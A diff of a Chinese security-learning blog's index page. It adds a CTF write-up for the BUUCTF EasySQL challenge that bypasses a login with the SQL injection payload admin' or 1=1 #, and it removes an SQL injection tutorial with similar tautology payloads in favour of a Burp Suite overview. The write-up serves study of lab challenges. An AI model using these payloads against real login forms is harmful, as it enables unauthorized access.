@@ -73,6 +73,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-BUUCTF-web-极客大挑战-2019-EasySQL" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/" class="article-date">
+  <time class="dt-published" datetime="2023-07-09T02:31:04.000Z" itemprop="datePublished">2023-07-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/">BUUCTF-web-[极客大挑战 2019]EasySQL</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="题目：BUUCTF-web-极客大挑战-2019-EasySQL"><a href="#题目：BUUCTF-web-极客大挑战-2019-EasySQL" class="headerlink" title="题目：BUUCTF-web-[极客大挑战 2019]EasySQL"></a>题目：BUUCTF-web-<strong><strong>[极客大挑战 2019]EasySQL</strong></strong></h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="观察题目"><a href="#观察题目" class="headerlink" title="观察题目"></a>观察题目</h3><p>打开靶机后界面如下：</p>
+<p><img src="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/1.jpg" alt="image-1"></p>
+<p>需要用户进行登录：既需要进行sql查询，诸如类型为字符串注入</p>
+<p>需测试sql语句的字符串的闭合方式</p>
+<p>在用户名和密码输入admin并提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=admin&amp;password=admin HTTP/1.1</span><br><span class="line">Host: 9611ca2f-3862-48f6-9c53-dccd9eefbf33.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://9611ca2f-3862-48f6-9c53-dccd9eefbf33.node4.buuoj.cn:81/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>发现请求头为GET</p>
+<h3 id="测试字符串闭合方式"><a href="#测试字符串闭合方式" class="headerlink" title="测试字符串闭合方式"></a>测试字符串闭合方式</h3><p>对字符串闭合进行测试：在用户名处添加后缀</p>
+<ol>
+<li>admin”<ol>
+<li>测试结果返回错误的用户名和密码</li>
+</ol>
+</li>
+</ol>
+<p><img src="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/2.png" alt="image-2"></p>
+<ol start="2">
+<li>admin’<ol>
+<li>测试结果返回sql报错<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;admin&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+报错信息即可证明改题目字符串由<code>&#39;</code>闭合</li>
+</ol>
+</li>
+</ol>
+<h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>获取admin登录权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1 #</span><br><span class="line">GET /check.php?username=admin%27+or+1%3D1+%23&amp;password=admin</span><br><span class="line"></span><br><span class="line">&lt;#&gt; ：注释符，导致其后的内容被截断，从而绕过password</span><br><span class="line">&lt;or 1=1&gt; ：让where永远为真，绕过了username</span><br><span class="line">&lt;&#x27;&gt; ：闭合了username字符串，让其后的命令为sql语句而不是username字符串</span><br></pre></td></tr></table></figure>
+
+<p>发出请求后，成功获得flag</p>
+<p><img src="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/3.png" alt="image-3"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/" data-id="cljuunh650001g8v5fkfu61sh" data-title="BUUCTF-web-[极客大挑战 2019]EasySQL" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-反弹shell" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" class="article-date">
@@ -106,7 +174,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" data-id="clfpg8zts000xvwv50rce35ug" data-title="反弹shell" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E5%8F%8D%E5%BC%B9shell/" data-id="cljuunh6m0016g8v501c073cm" data-title="反弹shell" class="article-share-link">分享</a>
       
       
       
@@ -151,7 +219,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="clfpg8ztx001dvwv5gkgq1vn7" data-title="逻辑漏洞" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" data-id="cljuunh6q001kg8v514b9c8ev" data-title="逻辑漏洞" class="article-share-link">分享</a>
       
       
       
@@ -196,7 +264,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/Log4j/" data-id="clfpg8zti0004vwv539m913gz" data-title="Log4j" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/Log4j/" data-id="cljuunh680004g8v58bxfcq4w" data-title="Log4j" class="article-share-link">分享</a>
       
       
       
@@ -248,7 +316,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/OWASP/" data-id="clfpg8ztl000avwv58m49dypl" data-title="OWASP TOP 10" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/OWASP/" data-id="cljuunh6c000ag8v54dbd8oi4" data-title="OWASP TOP 10" class="article-share-link">分享</a>
       
       
       
@@ -293,7 +361,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/kali/" data-id="clfpg8ztr000rvwv55e980xcm" data-title="kali" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/kali/" data-id="cljuunh6h000og8v55kii5q6m" data-title="kali" class="article-share-link">分享</a>
       
       
       
@@ -338,52 +406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" data-id="clfpg8ztu0013vwv54fp874m8" data-title="OWASP TOP 10" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-面试记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time class="dt-published" datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/">面试情况记录</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="面试情况记录"><a href="#面试情况记录" class="headerlink" title="面试情况记录"></a>面试情况记录</h1>
-        
-          <p class="article-more-link">
-            <a href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" data-id="clfpg8ztx001evwv5fwon0f68" data-title="面试情况记录" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/web%E5%AE%9E%E6%88%98%E7%AF%87/" data-id="cljuunh6k000yg8v55qbg7f6i" data-title="OWASP TOP 10" class="article-share-link">分享</a>
       
       
       
@@ -428,7 +451,52 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" data-id="clfpg8ztx001gvwv550lt9znu" data-title="缓冲区溢出" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" data-id="cljuunh6p001hg8v52qpf9478" data-title="缓冲区溢出" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-面试记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time class="dt-published" datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/">面试情况记录</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="面试情况记录"><a href="#面试情况记录" class="headerlink" title="面试情况记录"></a>面试情况记录</h1>
+        
+          <p class="article-more-link">
+            <a href="/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2022/03/01/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/" data-id="cljuunh6p001ig8v52vq74j1e" data-title="面试情况记录" class="article-share-link">分享</a>
       
       
       
@@ -476,7 +544,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/02/01/JAVA/" data-id="clfpg8zth0003vwv53668h79q" data-title="JAVA" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/02/01/JAVA/" data-id="cljuunh6b0008g8v5b730gyka" data-title="JAVA" class="article-share-link">分享</a>
       
       
       
@@ -533,7 +601,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/AST/" data-id="clfpg8zt90000vwv5ecd9chzi" data-title="AST" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/AST/" data-id="cljuunh600000g8v55r5o6n1m" data-title="AST" class="article-share-link">分享</a>
       
       
       
@@ -589,7 +657,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/JavaScript-reverse/" data-id="clfpg8zti0005vwv53c2w9mw9" data-title="JavaScript-逆向" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/JavaScript-reverse/" data-id="cljuunh6d000dg8v5g9kt0yjx" data-title="JavaScript-逆向" class="article-share-link">分享</a>
       
       
       
@@ -636,7 +704,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2022/01/01/%E6%9E%81%E9%AA%8C%E6%BB%91%E5%9D%971/" data-id="clfpg8ztu0015vwv5dv9ucmci" data-title="极验滑块" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2022/01/01/%E6%9E%81%E9%AA%8C%E6%BB%91%E5%9D%971/" data-id="cljuunh6m0018g8v51umjfeef" data-title="极验滑块" class="article-share-link">分享</a>
       
       
       
@@ -681,7 +749,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/XSS/" data-id="clfpg8ztn000fvwv5hf6s0tov" data-title="XSS" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/XSS/" data-id="cljuunh6f000ig8v53dnqhe5y" data-title="XSS" class="article-share-link">分享</a>
       
       
       
@@ -726,7 +794,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/" data-id="clfpg8ztq000pvwv5bvs254zr" data-title="网络安全训练营" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/" data-id="cljuunh6i000sg8v556tdeuqi" data-title="网络安全训练营" class="article-share-link">分享</a>
       
       
       
@@ -771,7 +839,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/12/01/webSecurity/" data-id="clfpg8ztr000tvwv56r5n7ktn" data-title="webSecurity" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/12/01/webSecurity/" data-id="cljuunh6j000ug8v5037k73y7" data-title="webSecurity" class="article-share-link">分享</a>
       
       
       
@@ -785,9 +853,9 @@
 
 
   
-    <article id="post-SQLInject" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-burp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/11/01/SQLInject/" class="article-date">
+    <a href="/2021/11/01/burp/" class="article-date">
   <time class="dt-published" datetime="2021-10-31T16:00:00.000Z" itemprop="datePublished">2021-11-01</time>
 </a>
     
@@ -799,7 +867,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/11/01/SQLInject/">SQL注入</a>
+      <a class="p-name article-title" href="/2021/11/01/burp/">burpsuite</a>
     </h1>
   
 
@@ -807,450 +875,76 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="/2021/11/01/SQLInject/SQLInject.png" alt="SQLInject"></p>
-<h2 id="sql注入介绍"><a href="#sql注入介绍" class="headerlink" title="sql注入介绍"></a>sql注入介绍</h2><p>传入非加密数据的地方可能存在注入点</p>
-<p>什么是SQL注入</p>
+        <h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><h4 id="实现手机代理"><a href="#实现手机代理" class="headerlink" title="实现手机代理"></a>实现手机代理</h4><p><img src="/2021/11/01/burp/image-20211102110518594.png" alt="image-20211102110518594"></p>
+<p>按上图设施，将代理地址设置为任意地址，则将手机上网代理设置为burp主机的地址和端口就可以实现手机代理</p>
+<h4 id="对请求和响应的过滤"><a href="#对请求和响应的过滤" class="headerlink" title="对请求和响应的过滤"></a>对请求和响应的过滤</h4><p>过滤匹配是从上往下依次过滤</p>
+<p><img src="/2021/11/01/burp/image-20211102110857724.png" alt="image-20211102110857724"></p>
+<p><img src="/2021/11/01/burp/image-20211102110908183.png" alt="image-20211102110908183"></p>
+<p>and代表必须包含该匹配</p>
+<p>or代表可以包含该匹配</p>
+<h4 id="求改响应"><a href="#求改响应" class="headerlink" title="求改响应"></a>求改响应</h4><p><img src="/2021/11/01/burp/image-20211102111043915.png" alt="image-20211102111043915"></p>
+<h4 id="剔除js脚本"><a href="#剔除js脚本" class="headerlink" title="剔除js脚本"></a>剔除js脚本</h4><p>两种方法</p>
 <ul>
-<li>sql注入也是正常的web端口访问</li>
-<li>只是转入的参数值并非程序设计者所希望的，而是传入了嵌套SQL代码的参数值</li>
-<li>参数值利用程序处理注入者的逻辑，按注入者的期望执行数据库查询</li>
-<li>甚至页面呈现按SQL注入者期望的显示</li>
-<li><strong>通过应用程序把带有SQL代码的参数传递给数据库引擎</strong></li>
+<li>burp</li>
 </ul>
-<p>SQL注入漏洞的根本原因</p>
+<p><img src="/2021/11/01/burp/image-20211102133359955.png" alt="image-20211102133359955"></p>
 <ul>
-<li>应用程序的问题而不是系统和数据库的问题</li>
+<li>手动F12删除js脚本</li>
 </ul>
-<h2 id="sql基础ddl语句"><a href="#sql基础ddl语句" class="headerlink" title="sql基础ddl语句"></a>sql基础ddl语句</h2><p>DDL：数据定义语言</p>
-<p>DML：数据操作语言</p>
-<p>DCL：数据控制语言</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show databases</span><br><span class="line">显示所有数据库</span><br><span class="line"></span><br><span class="line">DDL的主要命令</span><br><span class="line">create</span><br><span class="line">alter</span><br><span class="line">drop</span><br></pre></td></tr></table></figure>
-
-<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><p>对表、视图等对象进行查询、插入、更新和删除操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select、insert、update、delete</span><br><span class="line"></span><br><span class="line">insert into user() value()</span><br><span class="line">insert into user() select</span><br><span class="line">insert into user set id=1</span><br><span class="line"></span><br><span class="line">insert 报错逻辑</span><br><span class="line">insert 后门逻辑</span><br><span class="line"></span><br><span class="line">注入逻辑 or</span><br><span class="line">name=&#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">update user set name=&quot;&quot; where uid=1</span><br><span class="line"></span><br><span class="line">select order by (name,3)</span><br><span class="line">select where in (select)</span><br><span class="line">select where exists (select)</span><br><span class="line">select a.name,b.uid from table1 a,table2 b</span><br><span class="line">left join 左连接，返回所有符合左表条件的数据和右表匹配的数据</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>报错</p>
+<h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h4 id="target作用域scope介绍"><a href="#target作用域scope介绍" class="headerlink" title="target作用域scope介绍"></a>target作用域scope介绍</h4><p><img src="/2021/11/01/burp/image-20211102134023507.png" alt="image-20211102134023507"></p>
+<p>添加到scope后，会根据域名，主机名去拦截内容，也可以指定拦截一个网站的特定目录下的请求。</p>
+<h4 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h4><p><img src="/2021/11/01/burp/image-20211102134613096.png" alt="image-20211102134613096"></p>
+<p>左边显示访问的url，按网站的层级深度，树形展示整个应用系统的结构和关联其他域的url情况。</p>
+<p>右边显示url被访问的明细列表，共访问那些url，请求和应答内容。</p>
+<p>可以对代理抓取的target的网站进行分析与比对</p>
+<h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>spider设置抓取设置、抓取代理设置、表单提交设置、应用登录设置、蜘蛛引擎设置、请求消息头设置</p>
+<p><img src="/2021/11/01/burp/1-7%20Burpsuite%20%E7%88%AC%E8%99%AB%E4%BB%8B%E7%BB%8D.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_333.jpg" alt="1-7 Burpsuite 爬虫介绍.pcwl_视频截图_333"></p>
+<p>被动抓取功能</p>
+<p>表单提交功能：自动匹配提交表单的内容</p>
+<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>自动检测web系统的各种漏洞</p>
+<p>可以设置探测漏洞的类型，频率等<img src="/2021/11/01/burp/image-20211102143311901.png" alt="image-20211102143311901"></p>
+<p><img src="/2021/11/01/burp/image-20211102143420886.png" alt="image-20211102143420886"></p>
+<p>设定探测位置</p>
+<p><img src="/2021/11/01/burp/image-20211102143336828.png" alt="image-20211102143336828"></p>
+<p>设置静态代码分析</p>
+<p><img src="/2021/11/01/burp/image-20211102143427859.png" alt="image-20211102143427859"></p>
+<p>scanner针对主动扫描漏洞还可以出具一份漏洞报告</p>
+<h2 id="intruder"><a href="#intruder" class="headerlink" title="intruder"></a>intruder</h2><p>intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，intruder通常会携带一个或多个有效攻击载荷，在不同的位置进行攻击重放，通过对比应答数据来分析获得需要的特征数据。</p>
+<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul>
+<li>标识符枚举：web应用程序经常使用标识符来引用用户、账户、资产等数据信息</li>
+<li>提取有用的数据：在某些场景下，而不是简单地识别有效标识符，需要通过简单标识符提取一些其他的数据</li>
+<li>模糊测试：很多输入性的漏洞，如SQL注入，跨站脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应程序进行检测。</li>
+</ul>
+<h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><p><img src="/2021/11/01/burp/image-20211102144753635.png" alt="image-20211102144753635"></p>
+<h4 id="暴力破解用户名密码"><a href="#暴力破解用户名密码" class="headerlink" title="暴力破解用户名密码"></a>暴力破解用户名密码</h4><p>使用intruder跑字典，根据响应包的长度判断那个爆破成功</p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>使用intruder跑字典，根据响应的状态码判断那个目论存在</p>
+<h4 id="Position"><a href="#Position" class="headerlink" title="Position"></a>Position</h4><p>针对HTTP某个位置或几个位置进行模糊测试，需要选择不同位置与Attack Type</p>
+<p>Attack Type：</p>
 <ul>
-<li>语法报错</li>
-<li>注入字符报错</li>
+<li>Sniper：狙击枪模式，只针对一个位置进行探测</li>
+<li>Battering ram：攻城锤模式，针对多个位置使用一个payload</li>
+<li>Pitchfork：单叉模式，针对多个位置使用不同的多个payload，每组payload在payload组中的位置相同。</li>
+<li>Cluster Bomb：激素炮模式，针对多个位置，全部组合</li>
 </ul>
-<p>注入逻辑</p>
-<ul>
-<li><p>空集逻辑：网页不报错，但页面没有内容</p>
-</li>
-<li><p>全集逻辑：网页不报错，但显示页面正常或者页面更多</p>
-</li>
+<h4 id="option"><a href="#option" class="headerlink" title="option"></a>option</h4><ul>
+<li>设置request请求内容</li>
+<li>Attack result设置</li>
+<li>Grep - Match设置：标出符合特定表达式的结果</li>
+<li>Grep - Exact设置：从结果中榨取有用信息</li>
+<li>Reflection设置</li>
 </ul>
-<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>记录联合（并集）union，union all</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user1UNION select * from user2</span><br><span class="line"></span><br><span class="line">select * from user1 UNION ALL select * from user2</span><br></pre></td></tr></table></figure>
-
-<p>联合记录的注入报错逻辑</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当第二部分字段数不符合时，网页报错或显示不正常</span><br><span class="line">当第二部分字段数符合时，网页显示正常</span><br><span class="line"></span><br><span class="line">在能够正常显示的情况下，当第一部分逻辑正常时，会正常显示，而当第一部分逻辑为假时，则会替代的显示第二部分的数据</span><br></pre></td></tr></table></figure>
-
-<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>数据控制语言：管理员来管理权限使用的</p>
-<p>grant 权限 on 数据库.表 to 用户名 identified by 密码</p>
-<h2 id="数值类型与注入逻辑"><a href="#数值类型与注入逻辑" class="headerlink" title="数值类型与注入逻辑"></a>数值类型与注入逻辑</h2><p>数值类型分类：</p>
-<p>整数：tinyint，smallint</p>
-<p>mediuint，int，bigint</p>
-<p>浮点数：float，decimal，double</p>
-<h4 id="数值越界"><a href="#数值越界" class="headerlink" title="数值越界"></a>数值越界</h4><p><img src="/2021/11/01/SQLInject/2-1%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_397.jpg" alt="2-1数值类型基础与注入基础.pcwl_视频截图_397"></p>
-<p>类型转换报错</p>
-<p><img src="/2021/11/01/SQLInject/2-1%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_489.jpg" alt="2-1数值类型基础与注入基础.pcwl_视频截图_489"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">全集逻辑：</span><br><span class="line">or --+2=--！！！2</span><br><span class="line">or 1=1</span><br><span class="line">空集逻辑</span><br><span class="line">and ！！！2=~2</span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure>
-
-<h2 id="日期事件类型"><a href="#日期事件类型" class="headerlink" title="日期事件类型"></a>日期事件类型</h2><p>date、datetime、timestamp、time、year</p>
-<h2 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h2><p>char、varchar、binary、varbinary、blob、text、enum、set</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">保存少量字符串</span><br><span class="line">char固定长度字符串</span><br><span class="line">varchar可变长度字符串</span><br><span class="line"></span><br><span class="line">保存二进制字符串</span><br><span class="line">binary固定长度二进制字符串</span><br><span class="line">varbinary可变长度二进制字符串</span><br></pre></td></tr></table></figure>
-
-<h4 id="越界报错"><a href="#越界报错" class="headerlink" title="越界报错"></a>越界报错</h4><p>越界报错目标是得到字段名，进而推测字段名含义与表的功能</p>
-<h4 id="类型转换错误"><a href="#类型转换错误" class="headerlink" title="类型转换错误"></a>类型转换错误</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname=&#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">显示全集</span><br><span class="line"></span><br><span class="line">select * from users where !!uname=&#x27;admin&#x27;;</span><br><span class="line">显示警告，爆出字段名</span><br></pre></td></tr></table></figure>
-
